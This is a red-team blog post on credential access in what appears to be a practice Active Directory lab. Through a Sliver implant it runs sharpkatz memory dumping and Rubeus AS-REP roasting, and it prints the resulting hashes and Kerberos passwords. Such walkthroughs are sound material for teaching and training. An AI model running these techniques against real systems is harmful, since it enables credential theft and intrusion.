<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>3. Credentials Access | Red Mercury</title>
  <meta name="author" content="Mostafa Noureldin">
  
  <meta name="description" content="IntroductionThrough this post we are building on the previous posts, where we achieved initial access and system level privilege escalation on onw of the targets.This post will introduce different techniques for credentials access.


Memory dumpingAfter gaining system user privilege on castelblack we can dump credentials from memory using sharpkatz:"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="3. Credentials Access"/>
  <meta property="og:site_name" content="Red Mercury"/>

  
    <meta property="og:image" content=""/>
  

  
  
  
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="https://mmnoureldin.github.io/Red-Team/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="https://mmnoureldin.github.io/Red-Team/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="https://mmnoureldin.github.io/Red-Team/">Red Mercury</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="https://mmnoureldin.github.io/Red-Team/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 3. Credentials Access</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Through this post we are building on the previous posts, where we achieved initial access and system level privilege escalation on onw of the targets.<br>This post will introduce different techniques for credentials access.</p>
<img src="https://mmnoureldin.github.io/Red-Team/2023/03/08/Credentials-Access/mindmap.png" class="">

<h2 id="Memory-dumping"><a href="#Memory-dumping" class="headerlink" title="Memory dumping"></a>Memory dumping</h2><p>After gaining <code>system</code> user privilege on <code>castelblack</code> we can dump credentials from memory using <code>sharpkatz</code>:</p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; sharpkatz </span><br><span class="line"></span><br><span class="line">[*] sharpkatz output:</span><br><span class="line">[*]</span><br><span class="line">[*] 			System Information</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*] | Platform: Win32NT                                                  |</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*] | Major: 10            | Minor: 0             | Build: 17763         |</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*] | Version: Microsoft Windows NT 10.0.17763.0                         |</span><br><span class="line">[*] ----------------------------------------------------------------------</span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id	: 0;427549 (00000000:00427549)</span><br><span class="line">[*] Session		: Service from 0</span><br><span class="line">[*] UserName		: DefaultAppPool</span><br><span class="line">[*] LogonDomain		: IIS APPPOOL</span><br><span class="line">[*] LogonServer		: </span><br><span class="line">[*] LogonTime		: 2023/03/08 00:47:35</span><br><span class="line">[*] SID			: S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">[*]</span><br><span class="line">[*]	 Msv</span><br><span class="line">[*]	  Domain   : NORTH</span><br><span class="line">[*]	  Username : CASTELBLACK$</span><br><span class="line">[*]	  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]	  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]	  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]	  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*]	 WDigest</span><br><span class="line">[*]	  Hostname : NORTH </span><br><span class="line">[*]	  Username : CASTELBLACK$ </span><br><span class="line">[*]	  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*]	 Kerberos</span><br><span class="line">[*]	  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]	  Username : CASTELBLACK$ </span><br><span class="line">[*]	  Password : 9&amp;e8Lhs<span class="variable">$bm</span>,\aH*M@FG_L4Ga!Jj<span class="string">&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*] Authentication Id	: 0;103697 (00000000:00103697)</span></span><br><span class="line"><span class="string">[*] Session		: Service from 0</span></span><br><span class="line"><span class="string">[*] UserName		: SQLTELEMETRY$SQLEXPRESS</span></span><br><span class="line"><span class="string">[*] LogonDomain		: NT Service</span></span><br><span class="line"><span class="string">[*] LogonServer		: </span></span><br><span class="line"><span class="string">[*] LogonTime		: 2023/03/08 00:38:00</span></span><br><span class="line"><span class="string">[*] SID			: S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Msv</span></span><br><span class="line"><span class="string">[*]	  Domain   : NORTH</span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$</span></span><br><span class="line"><span class="string">[*]	  LM       : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]	  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span></span><br><span class="line"><span class="string">[*]	  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span></span><br><span class="line"><span class="string">[*]	  DPAPI    : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 WDigest</span></span><br><span class="line"><span class="string">[*]	  Hostname : NORTH </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Kerberos</span></span><br><span class="line"><span class="string">[*]	  Domain   : north.sevenkingdoms.local </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;</span><span class="string">&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA<span class="variable">$PLN</span>&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;</span>`6*<span class="string">&quot;U.-(0*.</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*] Authentication Id	: 0;103528 (00000000:00103528)</span></span><br><span class="line"><span class="string">[*] Session		: Service from 0</span></span><br><span class="line"><span class="string">[*] UserName		: sql_svc</span></span><br><span class="line"><span class="string">[*] LogonDomain		: NORTH</span></span><br><span class="line"><span class="string">[*] LogonServer		: WINTERFELL</span></span><br><span class="line"><span class="string">[*] LogonTime		: 2023/03/08 00:38:00</span></span><br><span class="line"><span class="string">[*] SID			: S-1-5-21-1463460949-1766931997-624310855-1121</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Msv</span></span><br><span class="line"><span class="string">[*]	  Domain   : NORTH</span></span><br><span class="line"><span class="string">[*]	  Username : sql_svc</span></span><br><span class="line"><span class="string">[*]	  LM       : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]	  NTLM     : 84a5092f53390ea48d660be52b93b804</span></span><br><span class="line"><span class="string">[*]	  SHA1     : 9fd961155e28b1c6f9b3859f32f4779ad6a06404</span></span><br><span class="line"><span class="string">[*]	  DPAPI    : 1eda60fb7469fc282c6a44e4d6a06e31</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 WDigest</span></span><br><span class="line"><span class="string">[*]	  Hostname : NORTH </span></span><br><span class="line"><span class="string">[*]	  Username : sql_svc </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Kerberos</span></span><br><span class="line"><span class="string">[*]	  Domain   : NORTH.SEVENKINGDOMS.LOCAL </span></span><br><span class="line"><span class="string">[*]	  Username : sql_svc </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*] Authentication Id	: 0;66062 (00000000:00066062)</span></span><br><span class="line"><span class="string">[*] Session		: Interactive from 1</span></span><br><span class="line"><span class="string">[*] UserName		: DWM-1</span></span><br><span class="line"><span class="string">[*] LogonDomain		: Window Manager</span></span><br><span class="line"><span class="string">[*] LogonServer		: </span></span><br><span class="line"><span class="string">[*] LogonTime		: 2023/03/08 00:37:59</span></span><br><span class="line"><span class="string">[*] SID			: S-1-5-90-0-1</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Msv</span></span><br><span class="line"><span class="string">[*]	  Domain   : NORTH</span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$</span></span><br><span class="line"><span class="string">[*]	  LM       : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]	  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span></span><br><span class="line"><span class="string">[*]	  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span></span><br><span class="line"><span class="string">[*]	  DPAPI    : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 WDigest</span></span><br><span class="line"><span class="string">[*]	  Hostname : NORTH </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Kerberos</span></span><br><span class="line"><span class="string">[*]	  Domain   : north.sevenkingdoms.local </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : 9&amp;e8Lhs<span class="variable">$bm</span>,\aH*M@FG_L4Ga!Jj&#x27;&quot;</span>,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA<span class="variable">$PLN</span>&lt;kSALWQ4;!ZX<span class="comment">#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span></span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id	: 0;66003 (00000000:00066003)</span><br><span class="line">[*] Session		: Interactive from 1</span><br><span class="line">[*] UserName		: DWM-1</span><br><span class="line">[*] LogonDomain		: Window Manager</span><br><span class="line">[*] LogonServer		: </span><br><span class="line">[*] LogonTime		: 2023/03/08 00:37:59</span><br><span class="line">[*] SID			: S-1-5-90-0-1</span><br><span class="line">[*]</span><br><span class="line">[*]	 Msv</span><br><span class="line">[*]	  Domain   : NORTH</span><br><span class="line">[*]	  Username : CASTELBLACK$</span><br><span class="line">[*]	  LM       : 00000000000000000000000000000000</span><br><span class="line">[*]	  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span><br><span class="line">[*]	  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span><br><span class="line">[*]	  DPAPI    : 00000000000000000000000000000000</span><br><span class="line">[*]</span><br><span class="line">[*]	 WDigest</span><br><span class="line">[*]	  Hostname : NORTH </span><br><span class="line">[*]	  Username : CASTELBLACK$ </span><br><span class="line">[*]	  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*]	 Kerberos</span><br><span class="line">[*]	  Domain   : north.sevenkingdoms.local </span><br><span class="line">[*]	  Username : CASTELBLACK$ </span><br><span class="line">[*]	  Password : 9&amp;e8Lhs<span class="variable">$bm</span>,\aH*M@FG_L4Ga!Jj<span class="string">&#x27;&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA$PLN&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*] Authentication Id	: 0;996 (00000000:00000996)</span></span><br><span class="line"><span class="string">[*] Session		: Service from 0</span></span><br><span class="line"><span class="string">[*] UserName		: CASTELBLACK$</span></span><br><span class="line"><span class="string">[*] LogonDomain		: NORTH</span></span><br><span class="line"><span class="string">[*] LogonServer		: </span></span><br><span class="line"><span class="string">[*] LogonTime		: 2023/03/08 00:37:59</span></span><br><span class="line"><span class="string">[*] SID			: S-1-5-20</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Msv</span></span><br><span class="line"><span class="string">[*]	  Domain   : NORTH</span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$</span></span><br><span class="line"><span class="string">[*]	  LM       : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]	  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span></span><br><span class="line"><span class="string">[*]	  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span></span><br><span class="line"><span class="string">[*]	  DPAPI    : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 WDigest</span></span><br><span class="line"><span class="string">[*]	  Hostname : NORTH </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Kerberos</span></span><br><span class="line"><span class="string">[*]	  Domain   : NORTH.SEVENKINGDOMS.LOCAL </span></span><br><span class="line"><span class="string">[*]	  Username : castelblack$ </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*] Authentication Id	: 0;44322 (00000000:00044322)</span></span><br><span class="line"><span class="string">[*] Session		: Interactive from 0</span></span><br><span class="line"><span class="string">[*] UserName		: UMFD-0</span></span><br><span class="line"><span class="string">[*] LogonDomain		: Font Driver Host</span></span><br><span class="line"><span class="string">[*] LogonServer		: </span></span><br><span class="line"><span class="string">[*] LogonTime		: 2023/03/08 00:37:59</span></span><br><span class="line"><span class="string">[*] SID			: S-1-5-96-0-0</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Msv</span></span><br><span class="line"><span class="string">[*]	  Domain   : NORTH</span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$</span></span><br><span class="line"><span class="string">[*]	  LM       : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]	  NTLM     : 8962fcf61a771019bb4e9419f631c6b7</span></span><br><span class="line"><span class="string">[*]	  SHA1     : ed334359e08149f89ca46ca7a26ae4ab582b7696</span></span><br><span class="line"><span class="string">[*]	  DPAPI    : 00000000000000000000000000000000</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 WDigest</span></span><br><span class="line"><span class="string">[*]	  Hostname : NORTH </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Kerberos</span></span><br><span class="line"><span class="string">[*]	  Domain   : north.sevenkingdoms.local </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : 9&amp;e8Lhs$bm,\aH*M@FG_L4Ga!Jj&#x27;</span><span class="string">&quot;,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA<span class="variable">$PLN</span>&lt;kSALWQ4;!ZX#o+ErOVk&lt;fE^^aq[5#0P&quot;</span>`6*<span class="string">&quot;U.-(0*.</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*] Authentication Id	: 0;44262 (00000000:00044262)</span></span><br><span class="line"><span class="string">[*] Session		:  from 0</span></span><br><span class="line"><span class="string">[*] UserName		: CASTELBLACK$</span></span><br><span class="line"><span class="string">[*] LogonDomain		: </span></span><br><span class="line"><span class="string">[*] LogonServer		: </span></span><br><span class="line"><span class="string">[*] LogonTime		: 1601/01/01 02:00:00</span></span><br><span class="line"><span class="string">[*] SID			: </span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 WDigest</span></span><br><span class="line"><span class="string">[*]	  Hostname : NORTH </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : [NULL]</span></span><br><span class="line"><span class="string">[*]</span></span><br><span class="line"><span class="string">[*]	 Kerberos</span></span><br><span class="line"><span class="string">[*]	  Domain   : north.sevenkingdoms.local </span></span><br><span class="line"><span class="string">[*]	  Username : CASTELBLACK$ </span></span><br><span class="line"><span class="string">[*]	  Password : 9&amp;e8Lhs<span class="variable">$bm</span>,\aH*M@FG_L4Ga!Jj&#x27;&quot;</span>,maAho*c1&amp;h[gl!2ZdsdEN)5tt`QEn3D7$-VjM =%PA<span class="variable">$PLN</span>&lt;kSALWQ4;!ZX<span class="comment">#o+ErOVk&lt;fE^^aq[5#0P&quot;`6*&quot;U.-(0*.</span></span><br><span class="line">[*]</span><br><span class="line">[*] Authentication Id	: 0;999 (00000000:00000999)</span><br><span class="line">[*] Session		:  from 0</span><br><span class="line">[*] UserName		: castelblack$</span><br><span class="line">[*] LogonDomain		: </span><br><span class="line">[*] LogonServer		: </span><br><span class="line">[*] LogonTime		: 1601/01/01 02:00:00</span><br><span class="line">[*] SID			: </span><br><span class="line">[*]</span><br><span class="line">[*]	 WDigest</span><br><span class="line">[*]	  Hostname : NORTH </span><br><span class="line">[*]	  Username : CASTELBLACK$ </span><br><span class="line">[*]	  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line">[*]	 Kerberos</span><br><span class="line">[*]	  Domain   : NORTH.SEVENKINGDOMS.LOCAL </span><br><span class="line">[*]	  Username : castelblack$ </span><br><span class="line">[*]	  Password : [NULL]</span><br><span class="line">[*]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We were able to find the account <code>sql_svc</code> hash <code>84a5092f53390ea48d660be52b93b804</code> among other hashes.</p>
<h2 id="ASREPROAST"><a href="#ASREPROAST" class="headerlink" title="ASREPROAST"></a>ASREPROAST</h2><p>Checking if a domain user does not have Kerberos preauthentication enabled.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sliver (REAL_ROBIN) &gt; rubeus  asreproast /format:hashcat /domain:north.sevenkingdoms.local /nowrap</span><br><span class="line"></span><br><span class="line">[*] rubeus output:</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.0.1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: AS-REP roasting</span><br><span class="line"></span><br><span class="line">[*] Target Domain          : north.sevenkingdoms.local</span><br><span class="line"></span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://winterfell.north.sevenkingdoms.local/DC=north,DC=sevenkingdoms,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&#x27;</span></span><br><span class="line">[*] SamAccountName         : brandon.stark</span><br><span class="line">[*] DistinguishedName      : CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=<span class="built_in">local</span></span><br><span class="line">[*] Using domain controller: winterfell.north.sevenkingdoms.local (192.168.24.11)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) <span class="keyword">for</span>: <span class="string">&#x27;north.sevenkingdoms.local\brandon.stark&#x27;</span></span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP <span class="built_in">hash</span>:</span><br><span class="line"></span><br><span class="line">      $krb5asrep$23<span class="variable">$brandon</span>.stark@north.sevenkingdoms.local:630E0BFBA9A62EDEB4F119823A037E3C<span class="variable">$DFB26233F0EF839793B7A2C8C6EB173A05218DA54E8CFDDFA7A726AB7831B113FC3257A71FE5E931D12BA020A68DE9CD83C28D2CD73BDD2C8A7473604D084984A2A0B177B35D1AEAFAA70874D4D6F55A9BBB80B1074894336907EF3FC7C8FCFC3F8B84511FAFE0229C076ADA8D97C83BB31051022598DE1EEEE10EA261E423DA80009D7AD041606F5FD9C384F974F608F41A266B4402EFD15923614CF855740FD98AC7DA75C27573DE2413A4297446B6550BD4D65F1B6526763CEA3E30F325E746A4E2B79D9DA5DB3955F0B47958ED9D50F3C4477CB6AC02E6C27133660CF3B24A234B0E0A6857CFC8681E0B5667C6C424DB55986850A3793B17A53F86BFB4FE88F85C2AF22F</span></span><br></pre></td></tr></table></figure>

<p>We got user <code>brandon.stark</code> AS_REP message, let’s use hashcat to crack it.</p>
